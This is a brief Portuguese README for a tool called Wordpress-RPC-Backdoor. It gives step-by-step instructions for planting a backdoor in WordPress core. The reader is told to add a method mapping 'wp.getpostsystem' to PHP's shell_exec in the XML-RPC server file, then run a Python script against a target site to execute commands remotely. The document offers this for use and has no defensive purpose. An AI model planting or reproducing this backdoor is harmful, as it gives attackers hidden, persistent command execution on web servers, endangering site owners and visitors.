# Wordpress-RPC-Backdoor
XML-RPC Backdoor - WP

- Foi escrito para executar utiliando comandos padrões do linux, pode ser facilmente adaptavel para o seu ambiente windows!


- implantar o backdoor:

- edite o arquivo "wp-includes/class-wp-xmlrpc-server.php" no core do wp.
- adicione no array $this->methods o seguinte registro:
  ```
  'wp.getpostsystem' => 'shell_exec',
  ```
  
- execute o python:

```
python rpc.py http://target.com
```


